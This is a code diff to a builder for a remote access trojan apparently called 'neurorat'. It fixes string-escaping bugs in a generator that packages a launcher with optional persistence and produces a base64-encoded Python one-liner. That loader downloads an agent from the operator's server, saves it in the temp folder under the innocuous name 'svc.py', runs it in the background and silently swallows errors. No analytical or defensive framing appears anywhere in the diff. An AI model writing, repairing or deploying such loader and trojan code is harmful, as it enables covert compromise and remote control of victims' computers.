@@ -83,7 +83,8 @@ def create_zip_package(output_path: str, server_host: str, server_port: int,
         # Create a launcher script
         launcher_path = os.path.join(temp_dir, "launch.py")
         with open(launcher_path, 'w') as f:
-            f.write(f"""#!/usr/bin/env python3
+            persistence_arg = ', "--persistence"' if with_persistence else ''
+            f.write(f'''#!/usr/bin/env python3
 import os
 import sys
 import subprocess
@@ -95,12 +96,12 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from neurorat_launcher import main
 
 # Set arguments for the launcher
-sys.argv = ["neurorat_launcher.py", "run", "--server", "{server_host}", "--port", "{server_port}"{', "--persistence"' if with_persistence else ''}]
+sys.argv = ["neurorat_launcher.py", "run", "--server", "{server_host}", "--port", "{server_port}"{persistence_arg}]
 
 # Run the launcher
 if __name__ == "__main__":
     main()
-""")
+''')
         
         # Create a basic batch file for Windows
         batch_path = os.path.join(temp_dir, "launch.bat")
@@ -276,28 +277,31 @@ def generate_base64_loader(server_host: str, server_port: int,
 import os,sys,time,uuid,socket,platform,subprocess,threading,base64
 import urllib.request as request
 
+# Define parameters directly in the executed code
+_server_host = \"{server_host}\"
+_server_port = {server_port}
+_with_persistence = {with_persistence}
+
 # Download agent
 def dl():
     try:
-        # Download agent code
-        server = server_host
-        port = server_port
-        u = f"http://{server}:{port}/dl/neurorat_agent.py"
+        # Download agent code using defined parameters
+        u = f\"http://{{_server_host}}:{{_server_port}}/dl/neurorat_agent.py\" # Use f-string with embedded vars
         r = request.urlopen(u).read()
         
         # Save to temp file
-        p = os.path.join(os.environ.get('TEMP', '/tmp'), "svc.py")
+        p = os.path.join(os.environ.get('TEMP', '/tmp'), \"svc.py\")
         with open(p, 'wb') as f:
             f.write(r)
         
-        # Run agent
-        args_list = [sys.executable, p, "--server", server, "--port", str(port)]
-        if with_persistence:
-            args_list.append("--persistence")
+        # Run agent using embedded vars
+        args_list = [sys.executable, p, \"--server\", _server_host, \"--port\", str(_server_port)]
+        if _with_persistence:
+            args_list.append(\"--persistence\")
         subprocess.Popen(args_list)
 
     except Exception as e:
-        pass
+        pass # Consider logging the exception here
 
 # Run in background
 threading.Thread(target=dl).start()
@@ -306,10 +310,10 @@ threading.Thread(target=dl).start()
     # Encode to Base64
     encoded = base64.b64encode(python_code.encode()).decode()
     
-    # Create one-liner
-    one_liner = f"python -c \"import base64,sys;exec(base64.b64decode('{encoded}').decode())\"" 
+    # Create one-liner using python3 and single quotes for the -c command
+    one_liner = f'python3 -c \'import base64,sys;exec(base64.b64decode("{encoded}").decode())\''
     
-    print(f"Base64 one-liner generated ({len(one_liner)} chars)")
+    print(f"Base64 one-liner generated ({{len(one_liner)}} chars)")
     return one_liner
 
 def main():
